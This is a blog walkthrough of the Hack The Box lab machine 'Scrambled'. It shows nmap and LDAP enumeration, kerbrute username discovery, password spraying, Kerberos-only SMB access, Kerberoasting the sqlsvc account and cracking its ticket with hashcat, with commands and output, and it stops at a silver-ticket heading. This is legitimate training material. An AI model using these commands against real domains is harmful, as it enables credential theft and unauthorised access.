+++
tags = ["Box", "HTB", "Medium", "Windows", "Kerberos", "MSSQL", ".NET", "Deserialization", "CSharp"]
draft = false
title = "Scrambled HTB Walkthrough"
author = "bloodstiller"
date = 2024-10-09
+++

## Scrambled Hack The Box Walkthrough/Writeup: {#scrambled-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Scrambled>


## How I use variables &amp; wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.
-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}

-   **Basic Scan**:
    -   `nmap $box -Pn -oA basicScan`
        ```shell
          kali in 46.02-HTB/BlogEntriesMade/Scrambled/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
          🕙 08:18:34 zsh ❯ nmap $box -Pn -oA basicScan
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 08:18 BST
          Nmap scan report for 10.129.174.234
          Host is up (0.039s latency).
          Not shown: 987 filtered tcp ports (no-response)
          PORT     STATE SERVICE
          53/tcp   open  domain
          80/tcp   open  http
          88/tcp   open  kerberos-sec
          135/tcp  open  msrpc
          139/tcp  open  netbios-ssn
          389/tcp  open  ldap
          445/tcp  open  microsoft-ds
          464/tcp  open  kpasswd5
          593/tcp  open  http-rpc-epmap
          636/tcp  open  ldapssl
          1433/tcp open  ms-sql-s
          3268/tcp open  globalcatLDAP
          3269/tcp open  globalcatLDAPssl

          Nmap done: 1 IP address (1 host up) scanned in 19.92 seconds

        ```
    -   Some great targets here:
        -   webserver
        -   dns
        -   smb
        -   ldap
        -   mssql

-   **In depth scan**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in 46.02-HTB/BlogEntriesMade/Scrambled/scans/nmap  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh  took 11s
    🕙 14:38:27 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-06 14:38 BST
    Stats: 0:01:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 48.86% done; ETC: 14:41 (0:01:14 remaining)
    Nmap scan report for 10.129.115.202
    Host is up (0.038s latency).
    Not shown: 65513 filtered tcp ports (no-response)
    Bug in ms-sql-ntlm-info: no string output.
    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Microsoft IIS httpd 10.0
    |_http-title: Scramble Corp Intranet
    |_http-server-header: Microsoft-IIS/10.0
    | http-methods:
    |_  Potentially risky methods: TRACE
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-06 13:41:06Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
    |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=DC1.scrm.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
    | Not valid before: 2022-06-09T01:42:36
    |_Not valid after:  2023-06-09T01:42:36
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC1.scrm.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
    | Not valid before: 2022-06-09T01:42:36
    |_Not valid after:  2023-06-09T01:42:36
    |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
    1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
    | ms-sql-info:
    |   10.129.115.202:1433:
    |     Version:
    |       name: Microsoft SQL Server 2019 RTM
    |       number: 15.00.2000.00
    |       Product: Microsoft SQL Server 2019
    |       Service pack level: RTM
    |       Post-SP patches applied: false
    |_    TCP port: 1433
    |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Not valid before: 2024-10-06T07:30:55
    |_Not valid after:  2054-10-06T07:30:55
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
    | ssl-cert: Subject: commonName=DC1.scrm.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
    | Not valid before: 2022-06-09T01:42:36
    |_Not valid after:  2023-06-09T01:42:36
    |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
    3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
    |_ssl-date: 2024-10-06T13:44:16+00:00; 0s from scanner time.
    | ssl-cert: Subject: commonName=DC1.scrm.local
    | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC1.scrm.local
    | Not valid before: 2022-06-09T01:42:36
    |_Not valid after:  2023-06-09T01:42:36
    4411/tcp  open  found?
    | fingerprint-strings:
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
    |     SCRAMBLECORP_ORDERS_V1.0.3;
    |   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
    |     SCRAMBLECORP_ORDERS_V1.0.3;
    |_    ERROR_UNKNOWN_COMMAND;
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  mc-nmf        .NET Message Framing
    49667/tcp open  msrpc         Microsoft Windows RPC
    49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49674/tcp open  msrpc         Microsoft Windows RPC
    49698/tcp open  msrpc         Microsoft Windows RPC
    52608/tcp open  msrpc         Microsoft Windows RPC
    57490/tcp open  msrpc         Microsoft Windows RPC
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port4411-TCP:V=7.94SVN%I=7%D=10/6%Time=67029371%P=x86_64-pc-linux-gnu%r
    SF:(NULL,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(GenericLines,1D,"SCRAMB
    SF:LECORP_ORDERS_V1\.0\.3;\r\n")%r(GetRequest,35,"SCRAMBLECORP_ORDERS_V1\.
    SF:0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(HTTPOptions,35,"SCRAMBLECORP_OR
    SF:DERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RTSPRequest,35,"SCRAMB
    SF:LECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(RPCCheck,1D,"
    SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(DNSVersionBindReqTCP,1D,"SCRAMBLE
    SF:CORP_ORDERS_V1\.0\.3;\r\n")%r(DNSStatusRequestTCP,1D,"SCRAMBLECORP_ORDE
    SF:RS_V1\.0\.3;\r\n")%r(Help,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UN
    SF:KNOWN_COMMAND;\r\n")%r(SSLSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\
    SF:r\n")%r(TerminalServerCookie,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(
    SF:TLSSessionReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Kerberos,1D,"SC
    SF:RAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SMBProgNeg,1D,"SCRAMBLECORP_ORDERS_
    SF:V1\.0\.3;\r\n")%r(X11Probe,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(Fo
    SF:urOhFourRequest,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMM
    SF:AND;\r\n")%r(LPDString,35,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
    SF:WN_COMMAND;\r\n")%r(LDAPSearchReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
    SF:")%r(LDAPBindReq,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(SIPOptions,3
    SF:5,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n")%r(LAND
    SF:esk-RC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(TerminalServer,1D,"SCR
    SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(NCP,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3
    SF:;\r\n")%r(NotesRPC,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(JavaRMI,1D
    SF:,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(WMSRequest,1D,"SCRAMBLECORP_ORD
    SF:ERS_V1\.0\.3;\r\n")%r(oracle-tns,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n"
    SF:)%r(ms-sql-s,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n")%r(afp,1D,"SCRAMBLE
    SF:CORP_ORDERS_V1\.0\.3;\r\n")%r(giop,1D,"SCRAMBLECORP_ORDERS_V1\.0\.3;\r\
    SF:n");
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2019 (89%)
    Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
    No exact OS matches for host (test conditions non-ideal).
    Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time:
    |   date: 2024-10-06T13:43:41
    |_  start_date: N/A
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 324.38 seconds

    ```

    -   Interesting find here: Port `4411`, looks to be a custom service running.


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

<!--listend-->

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapchecker>

-   It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.
    1.  <span class="underline">We have the naming context of the domain</span>:
        ```shell
        kali in ~/Desktop/WindowsTools 🐍 v3.12.6  2GiB/15GiB | 0B/1GiB with /usr/bin/zsh
        🕙 08:19:00 zsh ❯ python3 ldapchecker.py $box
        Attempting to connect to 10.129.174.234 with SSL...
        Connected successfully. Retrieving server information...
        DSA info (from DSE):
          Supported LDAP versions: 3, 2
          Naming contexts:
            DC=scrm,DC=local
            CN=Configuration,DC=scrm,DC=local
            CN=Schema,CN=Configuration,DC=scrm,DC=local
            DC=DomainDnsZones,DC=scrm,DC=local
            DC=ForestDnsZones,DC=scrm,DC=local
        ```

    2.  <span class="underline">We have the domain functionaility level</span>:
        ```shell
        Other:
          domainFunctionality:
            7
          forestFunctionality:
            7
          domainControllerFunctionality:
            7
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here’s a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    3.  <span class="underline">We have the full server name</span>:
        -   Again we can see this has the CN as the base (mentioned previously.) 
            ```shell
            serverName:
                CN=DC1,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=scrm,DC=local
            ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   **I update my `/etc/hosts` file now that we have the server name**.
    -   This is so we can use tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration as well as other tools later on.


### Kerberos `88`: {#kerberos-88}


#### User enumeration using [Kerbrute](https://github.com/ropnop/kerbrute): {#user-enumeration-using-kerbrute}

-   **I use** [kerbrute](https://github.com/ropnop/kerbrute) **to check for usernames:**
    -   `kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt`
    -   I find 5 valid usersnames, I add these to my list of usernames:
    -   {{< figure src="/ox-hugo/2024-10-06-144403_.png" >}}


### SMB `445`: {#smb-445}


#### Checking for NULL &amp; Guest Sessions netexec: {#checking-for-null-and-guest-sessions-netexec}

-   **I check for NULL &amp; Guest session but they are not accessible**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   `netexec smb $box -u '' -p '' --shares`
    -   {{< figure src="/ox-hugo/2024-10-06-144142_.png" >}}

-   **I check to see if any of the users I found in kerbrute have used any of their names as a password**:
    -   `netexec smb $box -u Users.txt -p Users.txt --continue-on-success`
    -   {{< figure src="/ox-hugo/2024-10-06-144639_.png" >}}
    -   No hits though:


### DNS `53`: {#dns-53}


#### Using [dnsenum](https://www.kali.org/tools/dnsenum/) to check for interesting DNS records: {#using-dnsenum-to-check-for-interesting-dns-records}

-   **I fire up** [dnsenum](https://www.kali.org/tools/dnsenum/) **to enumerate any interesting DNS records**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`

-   **I get a hit on an interesting entry straight away**:
    -   `ws01.scrm.local 192.168.0.54`
    -   {{< figure src="/ox-hugo/2024-10-06-145801_.png" >}}
    -   This could indicate we have another host running on an internal network, or potentially this host is dual nicked and known by `WS01.scrm.local` on a seperate network.
    -   +Note+:
        -   I update my `/etc/hosts` file to contain this entry.


### HTTP `80`: {#http-80}


#### Finding an internal website: {#finding-an-internal-website}

-   **I open** [burpsuite](https://www.kali.org/tools/burpsuite/) **to proxy all traffic through**:
    -   I navigate to the webserver running on port 80 &amp; find an internal intranet site:
        -   {{< figure src="/ox-hugo/2024-10-06-150802_.png" >}}
        -   As we can see there is nothing to report in Wappalyzer.


#### Fuzzing for pages using `FFUF`: {#fuzzing-for-pages-using-ffuf}

-   **I use** [FFUF](https://www.kali.org/tools/ffuf/) **to fuzz for more** `.html` **pages whilst I explor the site**:
    -   `ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://$box/FUZZ.html -fc 403 -ic`
    -   {{< figure src="/ox-hugo/2024-10-06-153700_.png" >}}
    -   I don't find anything additional:

-   **I fuzz for more directories**:
    -   `ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$box/FUZZ -fc 403 -ic`
    -   {{< figure src="/ox-hugo/2024-10-06-195627_.png" >}}
    -   Nothing of particular note.


#### Discovering their was breach &amp; `NTLM` authentication is disabled: {#discovering-their-was-breach-and-ntlm-authentication-is-disabled}

-   **Navigating to the** `support.html` **page we can see the below alert**:
    -   {{< figure src="/ox-hugo/2024-10-06-150904_.png" >}}
    -   It says that they were breached and now all `NTLM` authentication has been disabled. Interesting.


#### Discovering Password Resets Cause Password to Be Set As Username: {#discovering-password-resets-cause-password-to-be-set-as-username}

-   Enumerating the site further we find the page `passwords.html` where it says the below:

    > Our self service password reset system will be up and running soon but in the meantime please call the IT support line and we will reset your password. If no one is available please leave a message stating your username and we will reset your password to be the same as the username.

    -   Meaning there is a good chance that a users password is their username, I have already tried this with SMB, but have not tried other services.
        -   +Note+: It turned out this was the way forward however something was up with my box, so had to reset.
-   I save the full email addresses to a list and try password spraying with them as the password as well as thes shortened username, but get no hits.


#### Discovering that `ksimpson` is most likely part of `IT/Support`: {#discovering-that-ksimpson-is-most-likely-part-of-it-support}

-   `ksimpson` **in screenshot**:
    -   Looking at the page `supportrequest.html` it details a process for providing network information &amp; there is a screenshot which has `ksimpson` as the user:
    -   {{< figure src="/ox-hugo/2024-10-06-152549_.png" >}}
    -   I believe we can safely assume that `ksimpson` is part of `IT/Support` in some capacity as they most likely made this screenshot. (This may not seem like much put could be a valauble target to go after later)


#### Sales Order App: {#sales-order-app}

-   **On the page** `salesorder.html` **find the following content**:
    -   {{< figure src="/ox-hugo/2024-10-06-200820_.png" >}}
    -   It shows that they have their own custom app running (which was expected given NMAP's output) &amp; that it's possible to enable debug logging. We don't have access to this app as far as I can see at the moment but this is good information.


### MSSQL `1433`: {#mssql-1433}

-   I try cred stuff using netexec with mssql option, but it fails. (Stay tuned to find out why later)


### ScrambleCorp Order Service `4411`: {#scramblecorp-order-service-4411}

-   From our NMAP scan it says:
    ```shell
    4411/tcp  open  found?
    | fingerprint-strings:
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
    |     SCRAMBLECORP_ORDERS_V1.0.3;
    |   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions:
    |     SCRAMBLECORP_ORDERS_V1.0.3;
    |_    ERROR_UNKNOWN_COMMAND;
    ```


#### Using nc to connect to port `4411`: {#using-nc-to-connect-to-port-4411}

-   **Finding** `SCRAMBLECORP_ORDERS_V1.0.3;`
    -   I use nc to connect to the service running on `4411`
        -   `nc $box 4411`
        -   {{< figure src="/ox-hugo/2024-10-06-151441_.png" >}}
        -   It tells me that there is a service called `SCRAMBLECORP_ORDERS_V1.0.3` running on the service (we knew this from the `NMAP` scan).
        -   What's most interesting to me is that the banner &amp; and the responses are all followed by a semi-colon `;` this is what usually follows an `SQL/MSSQL` statement.
            -   In the `NMAP` we can also see near the end it says `ms-sql-s, oracle-tns:`

-   **I try entering** `oracle-sql` **queries**:
    -   `SELECT * FROM v$version;`
    -   {{< figure src="/ox-hugo/2024-10-06-201341_.png" >}}
    -   No luck lets come back to this later.


## 2. Authenticated Enumeration: {#2-dot-authenticated-enumeration}


### Realizing the mistake I made when enumerating: {#realizing-the-mistake-i-made-when-enumerating}

-   After alot of enumeration, and some strange results from `netexec` and some other tools it dawned on me, all of my checks have been with `netexec` and SMB&#x2026;.which used NTLM&#x2026;.I need to try and connect to the service using `kerberos` if possible. I need to cred stuff using usernames as passwords but authenticating using `kerberos`.


### Connecting to the `SMB` shares as `ksimpson`: {#connecting-to-the-smb-shares-as-ksimpson}

-   As we cannot use `NTLM` authentication we have to force `kerberos` authentication. This is possible by passing most programs the `-k` flag, however most tools expect to be fed a `.cacche` authentication file by way fo the `KRB5CCNAME` variable in linux. So we have to somehow create a `.cacche` file or pass the creds directly on the CLI and have `kerberos` authenticate using them.
    -   I do some digging and I cannot find direct way to craft my own `.cacche` file. So instead I look to tools I can try and force into using CLI fed creds but authenticate using the `kerberos` protocol.


#### Trying to force `netexec` to use `kerberos` authentication: {#trying-to-force-netexec-to-use-kerberos-authentication}

-   **I try on netexec by passing the `-k` flag, but it does not work**:
    -   I try multiple methods but none work.
        -   `netexec smb $box -k`
        -   `netexec smb $box -u ksimpson -k`
        -   `netexec smb $box -u ksimpson -p ksimpson -k`
    -   {{< figure src="/ox-hugo/2024-10-06-204724_.png" >}}
        -   +Note+: I am using `ksimpson` as it just kinda feels like the move, with how much we have seen that username so far.

    -   Back to the drawing board.


#### Trying to force `smbmap` to use `kerberos` authentication: {#trying-to-force-smbmap-to-use-kerberos-authentication}

-   **I try to connect this time with** `smbmap` **and it's the same issue**:
    -   `smbmap -u $user -H $box -k`
    -   {{< figure src="/ox-hugo/2024-10-06-205223_.png" >}}


#### Trying to force `smbclient` to use `kerberos` authentication: {#trying-to-force-smbclient-to-use-kerberos-authentication}

-   **Big ol' \*miss here**:
    -   `smbclient -U $domain\$user \\\\$box\\ -k`
    -   {{< figure src="/ox-hugo/2024-10-06-205633_.png" >}}

-   It appears that `netexec` &amp; `smbmap`  expects a `.ccache` to provided via the `KRB5CCNAME` variable, and will not try the provided creds for `kerberos` authentication.


#### Using `impacket-smbclient` to authenticate to the SMB Share using `kerberos`: {#using-impacket-smbclient-to-authenticate-to-the-smb-share-using-kerberos}

-   **I look through the list of tools I use and what's left, my precious** `impacket-smbclient`:
    -   `impacket-smbclient $domain/$user:$user@dc1.$domain -k`
    -   IT CONNECTS!!!!
    -   {{< figure src="/ox-hugo/2024-10-06-205920_.png" >}}


### Finding a file called `Network Security Changes.pdf`: {#finding-a-file-called-network-security-changes-dot-pdf}

-   **Finding the** `.pdf`:
    -   Whilst enumerating the shares I find a file called `Network Security Changes.pdf` in the `Public` share:
        -   {{< figure src="/ox-hugo/2024-10-07-073456_.png" >}}

-   **I download the** `.pdf`:
    -   `get Network Security Changes.pdf`
    -   {{< figure src="/ox-hugo/2024-10-07-073603_.png" >}}

-   **I check all other shares but I am denied access**:
    -   {{< figure src="/ox-hugo/2024-10-07-073641_.png" >}}


#### Opening `Network Security Changes.pdf`: {#opening-network-security-changes-dot-pdf}

-   **Strange text&#x2026;hmmm?**
    -   When I initially open the file there is only a small amount of text.
    -   {{< figure src="/ox-hugo/2024-10-07-074339_.png" >}}

-   **Poor obfuscation attempted**:
    -   I press `CTRL+A` to select all text and can see that they have just made the text white.
    -   {{< figure src="/ox-hugo/2024-10-07-074545_.png" >}}

-   **I use** `pdftotext` **to convert the file to a** `.txt` **file**:
    -   `pdftotext *.pdf`
    -   {{< figure src="/ox-hugo/2024-10-07-074703_.png" >}}


#### I also try and connect to smb as the other users: {#i-also-try-and-connect-to-smb-as-the-other-users}

-   **I check if any other users can connect to SMB via kerberos but they cannot**
    -   {{< figure src="/ox-hugo/2024-10-07-080858_.png" >}}
    -   See, this is why using variables is so much easier, change on var `$user` and you can just repeat all your tasks.


#### Reading `Network Security Changes.pdf`: {#reading-network-security-changes-dot-pdf}

-   Once converted I open it up and find the following:
-   {{< figure src="/ox-hugo/2024-10-07-075057_.png" >}}
    -   **Key Points**:
        -   They were compromised via an `NTLM` Relaying attack which is why they deactivated `NTLM` authentication &amp; are under the impression `Kerberos` is more secure.
        -   When accessing resources we need to specify the full server name and CN name of the user. e.g. `ksimpson.scrm.local` instead of just the `SAM` name of `ksimpson`: We discovered this in our SMB connection.
        -   There are `creds` stored in their SQL HR Database however this has now been restricted.


#### Attempting to extract creator names from the `.PDF`: {#attempting-to-extract-creator-names-from-the-dot-pdf}

If you are not aware, it is sometimes possible to extract valid domain usernames from `pdf's` if they have been created on a Windows host. As often the Creator Field is populated using the Windows User's Logged-In Name

-   **Some reasons why the Creator Field Uses the Windows User's Logged-In Name**:
    -   **PDF Metadata Collection**:
        -   When creating a PDF, many programs (e.g., Microsoft Word, Adobe Acrobat) automatically pull metadata from the system.

    -   **System Environment Variables**:
        -   The logged-in Windows username is part of system environment variables. This is often used to populate fields like "`Creator`" in the PDF document.

    -   **Program Defaults**:
        -   By default, many PDF generation tools use the logged-in username as the creator unless manually changed by the user.

    -   **Tracking Ownership**:
        -   This feature helps track the original creator or author of a document for auditing or document management purposes.


##### Attempting to extract Usernames From the PDF using exiftool: {#attempting-to-extract-usernames-from-the-pdf-using-exiftool}

-   `exiftool -Creator -csv *pdf | cut -d, -f2 | sort | uniq > userNames.txt`
-   I run it and check the output of the file, however there are no valid usernames, just that it was created using Word 2010:
-   {{< figure src="/ox-hugo/2024-10-07-074023_.png" >}}

<!--list-separator-->

-  Command Breakdown:

    1.  `exiftool -Creator -csv *pdf`
        -   `exiftool`: Run the tool
        -   `-Creator`: Extracts the `Creator` metadata field from the files.
        -   `-csv`: Outputs the data in CSV format.
            -   This is the most important part for the rest of the command to work:
                -   The `CSV` format provides a structured way to output the metadata in rows and columns. When extracting metadata from multiple PDFs, each PDF's metadata is presented as a row, and each field (like "`Creator`") is a column. This makes it easier to process the data programmatically.
                -   **Simplicity**: When using tools like `cut`, it’s easier to extract specific fields by referring to column numbers (e.g., `-f2` for the second column), which is straightforward with `CSV` formatting.
        -   `*pdf`: Targets all PDF files in the current directory.
    2.  `| cut -d, -f2`
        -   `|`: Pipes the output from the previous command into the next.
        -   `cut`: Extracts specific fields from the CSV output.
        -   `-d,`: Uses a comma as the delimiter (since it's CSV data).
        -   `-f2`: Selects the second field, which contains the creator name.
    3.  `| sort`: Sorts the creator names alphabetically.
    4.  `| uniq`: Removes duplicate names, leaving only unique entries.

    5.  `> userNames.txt`
        -   Redirects the final output (unique creator names) into a file named `userNames.txt`


### Trying to Connect to `MSSQL` using `impacket-mssql`: {#trying-to-connect-to-mssql-using-impacket-mssql}

-   **I attempt to connect as all the users I have found so far**:
    -   `impacket-mssqlclient $domain/$user:$user@dc1.$domain -k`
    -   {{< figure src="/ox-hugo/2024-10-07-080307_.png" >}}
    -   What is interesting though is the response for the user `ksimpson` is different from all other users:
        -   `[-] ERROR(DC1): Line 1: Login failed for user 'SCRM\ksimpson'.`
    -   Which leads me to believe they may have access however I just need to find a password for them.


### Kerberoasting using Kerberos Credentials to Get More Kerberos Credentials: {#kerberoasting-using-kerberos-credentials-to-get-more-kerberos-credentials}

-   {{< figure src="/ox-hugo/moonmeme.jpg" >}}
-   As we have valid credentials we can use impackets suite of tools to further enumerate and exploit the target.


#### Using `impacket-GetUsersSPNs` to extract the `SQL` service Kerberos Tickets: {#using-impacket-getusersspns-to-extract-the-sql-service-kerberos-tickets}

-   **Kerberoasting with** `impacket-GetUserSPNs`:
    -   `impacket-GetUserSPNs $domain/$user -k -dc-host dc1.$domain -request -outputfile scrmtickets`
    -   {{< figure src="/ox-hugo/2024-10-07-083920_.png" >}}
    -   We get a hit &amp; get the `sqlsvc` ticket:


### Cracking the `sqlsvc` hashes with `hashcat`: {#cracking-the-sqlsvc-hashes-with-hashcat}

-   **I pass the hashes into hashcats**:
    -   `hashcat -m 13100 scrmtickets ~/Wordlists/rockyou.txt`
    -   {{< figure src="/ox-hugo/2024-10-07-084213_.png" >}}
    -   It cracks almost immediately &amp; now we have a creds for `mssql`


### Trying to connect to the `MSSQL` Service: {#trying-to-connect-to-the-mssql-service}

-   I try various ways with `impacket-mssqlclient` to connect with the password and it does not work.

-   **Re-exporting the tickets as** `.ccache` **file**:
    -   `impacket-GetUserSPNs $domain/$user -k -dc-host dc1.$domain -request -save`
    -   I then re-export the tickets but this time as a `.ccache` file by passing the `-save` flag.
    -   {{< figure src="/ox-hugo/2024-10-07-085557_.png" >}}

-   **I load it into the** `KRB5CCNAME` **variable**:
    -   However it doesn't work either. I think this is due it saying in the pdf that only domain admins have access to the she SQL server.


### I've got a `SilverTicket` maybe&#x2026; {#i-ve-got-a-silverticket-maybe-and-x2026}

